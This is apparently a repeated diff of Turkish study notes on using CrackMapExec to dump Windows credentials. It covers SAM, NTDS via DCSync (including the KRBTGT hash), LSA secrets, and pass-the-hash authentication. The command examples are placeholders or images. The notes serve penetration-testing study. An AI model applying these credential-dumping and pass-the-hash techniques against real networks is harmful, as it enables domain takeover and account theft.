+CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.
 
-LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
 
 
-
+Burada Kaldım 
 ### LSA'yı inceleyin
 
 ![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
@@ -8253,80 +8458,67 @@ Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“�
 Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
 
 
-Burada kaldım . 
-
-
 ### Gizli Bilgileri Bulma ve Kullanma
-Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
 
-Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.
 
 
 ### SAM
-SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
 
+SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.
 
 ### Dumping SAM
-![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
-![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+{{CODE_BLOCK_164}}
 
 
 ### NTDS Active Directory Database
 
-Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
 
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.
 
-Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+### Domain Controller üzerinden NTDS database dump etme
 
-Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+{{CODE_BLOCK_165}}
 
+`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.
 
-### Domain Controller'dan NTDS veritabanını boşaltma
-![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
-![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
-![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
-![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
-![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
-![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+### Yalnızca KRBTGT Hesabının Dump Edilmesi
 
---ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+{{CODE_BLOCK_166}}
 
-
-### Yalnızca KRBTGT Hesabının Boşaltılması
-![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
-
-Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
 
 
 ### Yalnızca Enabled Hesapları Gösterme
-![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
-![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
-![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
-![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+{{CODE_BLOCK_167}}
 
 
-### Using the Secrets (hashes)
+### Secrets (hash'leri) kullanma
 
-Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 
 
-CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
-
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:
 
 ### Using NTLM Hashes
-![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+{{CODE_BLOCK_168}}
 
 NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
 
 
 ### LSA Secrets/Cached Credentials
 
-CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.
 
-LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
 
 
-
+Burada Kaldım 
 ### LSA'yı inceleyin
 
 ![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
@@ -10052,80 +10244,67 @@ Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“�
 Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
 
 
-Burada kaldım . 
-
-
 ### Gizli Bilgileri Bulma ve Kullanma
-Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
 
-Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.
 
 
 ### SAM
-SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
 
+SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.
 
 ### Dumping SAM
-![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
-![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+{{CODE_BLOCK_164}}
 
 
 ### NTDS Active Directory Database
 
-Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
 
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.
 
-Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+### Domain Controller üzerinden NTDS database dump etme
 
-Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+{{CODE_BLOCK_165}}
 
+`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.
 
-### Domain Controller'dan NTDS veritabanını boşaltma
-![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
-![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
-![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
-![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
-![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
-![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+### Yalnızca KRBTGT Hesabının Dump Edilmesi
 
---ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+{{CODE_BLOCK_166}}
 
-
-### Yalnızca KRBTGT Hesabının Boşaltılması
-![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
-
-Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
 
 
 ### Yalnızca Enabled Hesapları Gösterme
-![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
-![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
-![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
-![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+{{CODE_BLOCK_167}}
 
 
-### Using the Secrets (hashes)
+### Secrets (hash'leri) kullanma
 
-Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 
 
-CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
-
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:
 
 ### Using NTLM Hashes
-![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+{{CODE_BLOCK_168}}
 
 NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
 
 
 ### LSA Secrets/Cached Credentials
 
-CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.
 
-LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
 
 
-
+Burada Kaldım 
 ### LSA'yı inceleyin
 
 ![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
@@ -11862,80 +12041,67 @@ Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“�
 Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
 
 
-Burada kaldım . 
-
-
 ### Gizli Bilgileri Bulma ve Kullanma
-Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
 
-Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.
 
 
 ### SAM
-SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
 
+SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.
 
 ### Dumping SAM
-![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
-![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+{{CODE_BLOCK_164}}
 
 
 ### NTDS Active Directory Database
 
-Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
 
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.
 
-Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+### Domain Controller üzerinden NTDS database dump etme
 
-Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+{{CODE_BLOCK_165}}
 
+`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.
 
-### Domain Controller'dan NTDS veritabanını boşaltma
-![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
-![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
-![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
-![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
-![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
-![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+### Yalnızca KRBTGT Hesabının Dump Edilmesi
 
---ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+{{CODE_BLOCK_166}}
 
-
-### Yalnızca KRBTGT Hesabının Boşaltılması
-![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
-
-Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
 
 
 ### Yalnızca Enabled Hesapları Gösterme
-![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
-![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
-![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
-![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+{{CODE_BLOCK_167}}
 
 
-### Using the Secrets (hashes)
+### Secrets (hash'leri) kullanma
 
-Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 
 
-CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
-
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:
 
 ### Using NTLM Hashes
-![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+{{CODE_BLOCK_168}}
 
 NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
 
 
 ### LSA Secrets/Cached Credentials
 
-CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.
 
-LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
 
 
-
+Burada Kaldım 
 ### LSA'yı inceleyin
 
 ![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
@@ -13678,80 +13844,67 @@ Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“�
 Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
 
 
-Burada kaldım . 
-
-
 ### Gizli Bilgileri Bulma ve Kullanma
